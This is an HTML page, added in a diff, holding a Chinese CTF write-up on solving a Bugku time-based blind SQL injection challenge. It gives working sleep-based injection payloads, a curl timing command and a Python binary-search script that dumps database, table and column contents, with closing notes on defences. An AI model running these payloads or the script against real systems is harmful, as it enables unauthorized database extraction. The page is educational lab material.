@@ -1,0 +1,200 @@
+<!DOCTYPE html>
+<html lang="zh-CN" data-theme="dark">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<!-- ↓↓↓ 改这里：标题 / 描述 / 地址 ↓↓↓ -->
+<title>Bugku 秋名山车神：写脚本跑时间盲注 · zhshy</title>
+<meta name="description" content="页面没有任何回显，只有响应快慢的区别。手工验证 sleep(3)、构造 if 布尔通道，再用 Python 二分法逐位把库名跑出来。">
+<meta name="author" content="zhshy">
+<meta property="og:type" content="article">
+<meta property="og:site_name" content="zhshy">
+<meta property="og:title" content="Bugku 秋名山车神：写脚本跑时间盲注">
+<meta property="og:description" content="页面什么也不回显，只有响应快慢的区别，这种题只能交给脚本。">
+<meta property="og:url" content="https://zhshy-chi.github.io/writeups/bugku-ae86.html">
+<link rel="icon" href="../assets/favicon.svg" type="image/svg+xml">
+<link rel="stylesheet" href="../assets/css/style.css">
+<script>
+(function () {
+  try {
+    var t = localStorage.getItem('theme');
+    if (t === 'light' || t === 'dark') document.documentElement.dataset.theme = t;
+  } catch (e) {}
+})();
+</script>
+</head>
+<!-- ↓ data-slug 必须和 writeups.js 里的 slug 一致，上一篇/下一篇才能对上 ↓ -->
+<body data-page="article" data-slug="bugku-ae86">
+<a class="skip-link" href="#main">跳到正文</a>
+<div class="progress" id="progress" aria-hidden="true"></div>
+
+<header class="site-header">
+  <div class="wrap header-inner">
+    <a class="brand" href="../index.html" aria-label="zhshy 首页">
+      <span class="brand-mark">~/</span><span class="brand-text">zhshy</span>
+    </a>
+    <nav class="site-nav" id="site-nav" aria-label="主导航">
+      <a href="../index.html">首页</a>
+      <a href="../writeups.html">Writeups</a>
+      <a href="../about.html">关于</a>
+    </nav>
+    <div class="header-actions">
+      <button class="icon-btn" id="theme-toggle" type="button" aria-label="切换深色/浅色主题">
+        <svg class="i-moon" viewBox="0 0 24 24" aria-hidden="true"><path d="M21 12.8A9 9 0 1 1 11.2 3a7 7 0 0 0 9.8 9.8Z"/></svg>
+        <svg class="i-sun" viewBox="0 0 24 24" aria-hidden="true"><circle cx="12" cy="12" r="4.2"/><path d="M12 2.6v2.2M12 19.2v2.2M2.6 12h2.2M19.2 12h2.2M5.4 5.4l1.6 1.6M17 17l1.6 1.6M18.6 5.4 17 7M7 17l-1.6 1.6"/></svg>
+      </button>
+      <a class="icon-btn" href="https://github.com/zhshy-chi" target="_blank" rel="noopener" aria-label="GitHub 主页">
+        <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M12 2A10 10 0 0 0 8.8 21.5c.5.1.7-.2.7-.5v-1.9c-2.8.6-3.4-1.3-3.4-1.3-.5-1.2-1.1-1.5-1.1-1.5-.9-.6.1-.6.1-.6 1 .1 1.5 1 1.5 1 .9 1.5 2.3 1.1 2.9.8.1-.7.4-1.1.7-1.4-2.2-.3-4.6-1.1-4.6-5 0-1.1.4-2 1-2.7-.1-.3-.4-1.3.1-2.7 0 0 .8-.3 2.7 1a9.3 9.3 0 0 1 5 0c1.9-1.3 2.7-1 2.7-1 .5 1.4.2 2.4.1 2.7.6.7 1 1.6 1 2.7 0 3.9-2.4 4.7-4.6 5 .4.3.7.9.7 1.9v2.8c0 .3.2.6.7.5A10 10 0 0 0 12 2Z"/></svg>
+      </a>
+      <button class="icon-btn nav-toggle" id="nav-toggle" type="button" aria-label="打开导航菜单" aria-expanded="false" aria-controls="site-nav">
+        <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M4 7h16M4 12h16M4 17h16"/></svg>
+      </button>
+    </div>
+  </div>
+</header>
+
+<main id="main">
+<article class="wrap article">
+
+  <nav class="breadcrumb" aria-label="面包屑">
+    <a href="../index.html">首页</a><span>/</span>
+    <a href="../writeups.html">Writeups</a><span>/</span>
+    <span class="current">Web</span>
+  </nav>
+
+  <header class="article-head">
+    <div class="article-badges">
+      <span class="badge" data-cat="Web">Web</span>
+      <span class="tag">时间盲注</span>
+      <span class="tag">Python</span>
+    </div>
+    <h1>Bugku 秋名山车神：写脚本跑时间盲注</h1>
+    <p class="article-meta">
+      <time datetime="2026-10-29">2026-10-29</time>
+      <span class="dot-sep">·</span>
+      <span>约 10 分钟</span>
+      <span class="dot-sep">·</span>
+      <span>Bugku CTF</span>
+    </p>
+    <p class="article-lead">
+      页面什么也不回显，没有报错，只有响应快慢的区别。这种题手工是做不完的，只能把判断交给脚本 —— 顺便治好了我的急性子。
+    </p>
+  </header>
+
+  <div class="article-layout">
+    <div class="prose" id="prose">
+
+      <h2>题目信息</h2>
+      <table>
+        <tbody>
+          <tr><th>平台</th><td>Bugku CTF</td></tr>
+          <tr><th>类型</th><td>Web / 时间盲注</td></tr>
+          <tr><th>知识点</th><td>sleep、if 条件、二分法、requests</td></tr>
+        </tbody>
+      </table>
+
+      <h2>什么也不回显</h2>
+      <p>页面只有一个输入框，提交后永远显示「查询失败」，不管输入什么。没有报错信息，也没有数据，union 试了几个都塞不进去。这种页面最容易让人放弃，但先别急 —— 回显可以没有，响应时间却一定存在。</p>
+      <p>我的习惯是先确认「服务端有没有执行我的输入」：输入一个会拖慢查询的表达式，如果页面变慢，通道就成立。顺便对比一下布尔盲注：如果页面有「成功/失败」两种明显不同的回显，可以直接拿它当通道，一秒能跑十几个字符，比时间盲注快一个数量级。这题连这种差异都没有，只能退到时间。做题时先找最快的通道，再退而求其次，别一上来就写 sleep。</p>
+
+      <h2>手工验证 sleep(3)</h2>
+      <p>先猜闭合方式。用最笨的办法，把三种常见的都试一遍：</p>
+      <pre><code class="language-sql">1 and sleep(3)
+1' and sleep(3) -- 
+1" and sleep(3) -- </code></pre>
+      <p>用 curl 的 -w 参数看耗时，或者在 Burp 里看 Response received 的时间。如果只有某一种闭合方式让响应稳定慢 3 秒，说明注入点成立，而且这条通道是「时间」。</p>
+      <pre><code class="language-bash">time curl -s "http://靶机/?id=1'%20and%20sleep(3)%20--%20" -o /dev/null</code></pre>
+      <p>注意 URL 里的空格要编码成 %20，-- 后面的空格也不能丢，否则注释不成立，语句直接报错。</p>
+
+      <h2>把时间变成布尔通道</h2>
+      <p>sleep 只能回答「是」。要逐位取字符，得让它变成条件判断：</p>
+      <pre><code class="language-sql">1' and if(ascii(substr(database(),1,1))&gt;100,sleep(2),0) -- </code></pre>
+      <p>意思是：取当前库名第 1 个字符的 ASCII 码，如果大于 100 就睡 2 秒，否则立刻返回。响应慢等于条件为真，响应快等于条件为假。一次请求只回答一个是非题，用二分法 7 次左右就能确定一个字节，比线性猜快得多。</p>
+      <p>验证条件好不好用，有个笨办法：先不猜字符，直接发 if(1=1,sleep(2),0) 和 if(1=2,sleep(2),0)，看两次的时间差是否明显。差得出来，二分才有意义；差不出来，先把 sleep 调大，或者换个网络环境再说。</p>
+      <p>这里有个细节：substr 的位置从 1 开始，不是 0；ascii 对中文会返回多字节，所以库名是英文时最好跑。</p>
+
+      <h2>Python 脚本：二分法逐位取字符</h2>
+      <p>把上面的判断封装成函数，外层套二分查找：</p>
+      <pre><code class="language-python">import requests, time
+
+URL = "http://靶机/"
+DELAY = 2
+THRESH = 1.6
+
+def cond(payload):
+    t = time.time()
+    try:
+        requests.get(URL, params={"id": payload}, timeout=DELAY + 3)
+    except requests.exceptions.Timeout:
+        return True
+    return time.time() - t &gt; THRESH
+
+def get_char(sql, pos):
+    lo, hi = 32, 127
+    while lo &lt; hi:
+        mid = (lo + hi) // 2
+        p = ("1' and if(ascii(substr((%s),%d,1))&gt;%d,sleep(%d),0) -- "
+             % (sql, pos, mid, DELAY))
+        if cond(p):
+            lo = mid + 1
+        else:
+            hi = mid
+    return chr(lo)
+
+def dump(sql, n=32):
+    out = ""
+    for i in range(1, n + 1):
+        c = get_char(sql, i)
+        if c == "\x00":
+            break
+        out += c
+        print(out, flush=True)
+    return out
+
+print(dump("select database()"))</code></pre>
+      <p>几个关键参数：THRESH 要小于 sleep 时间、大于正常响应时间；网络抖动大的话多测几次取中位数；每个字符都必须重新计时，不要复用上一次的结果。跑通库名之后，把 sql 换成查表名、列名、字段值，同一个脚本能一直用下去。</p>
+      <p>实际做法是分三段跑：先 select database()，再查 information_schema.tables 拿表名，最后查列名和那几个字段。字段值可能很长，脚本里用 substring 分段取，遇到空字符就停，别硬编码长度。</p>
+
+      <h2>耐心、限速与踩坑</h2>
+      <ul>
+        <li>一开始 THRESH 设成 1 秒，网络一抖就误判，跑出来的库名是乱码；</li>
+        <li>忘了给 timeout 留余量，requests 在 sleep 期间自己先超时了，全部判真；</li>
+        <li>一个 20 位的库名要好几分钟，先跑通短的，再查长的；</li>
+        <li>请求之间加 0.1 秒间隔，练习环境也别打崩。</li>
+      </ul>
+
+      <h2>为什么它慢却通用</h2>
+      <p>时间盲注不依赖回显、不依赖报错，只要 SQL 被执行就有通道，所以在「什么都没有」的场景下几乎总能打通。代价是慢，而且受网络影响，脚本的阈值要调。防御上，参数化查询依然是从根上解决；此外给数据库账号限权、给接口限速、把错误页和响应耗时抹平（统一超时、统一提示），都能让这条通道变得不可用，或者代价高到不值得。</p>
+      <p>这题还让我第一次认真写了「可复用的脚本」而不是一次性 payload —— 后来做别的盲注题，改两行就能跑，省下来的时间比省下的手速多得多。</p>
+      <p>最后提一句：时间盲注的流量特征很明显，sleep 会让请求耗时异常拉长。真实环境里的 WAF 和监控，经常就是靠这个特征抓人的。</p>
+
+    </div>
+
+    <aside class="toc" id="toc" aria-label="文章目录">
+      <p class="toc-title">目录</p>
+      <nav id="toc-nav"></nav>
+    </aside>
+  </div>
+
+  <nav class="pager" id="pager" aria-label="上一篇与下一篇"></nav>
+  <p class="back-link"><a href="../writeups.html">← 返回全部 Writeups</a></p>
+
+</article>
+</main>
+
+<footer class="site-footer">
+  <div class="wrap footer-inner">
+    <p>© <span id="year">2026</span> zhshy · 本站内容仅供学习交流，请勿用于未授权测试</p>
+    <p class="footer-links">
+      <a href="../writeups.html">Writeups</a>
+      <a href="../about.html">关于</a>
+      <a href="https://github.com/zhshy-chi/zhshy-chi.github.io" target="_blank" rel="noopener">源码</a>
+    </p>
+  </div>
+</footer>
+
+<script src="../assets/js/writeups.js"></script>
+<script src="../assets/js/site.js"></script>
+<script src="../assets/js/article.js"></script>
+</body>
+</html>
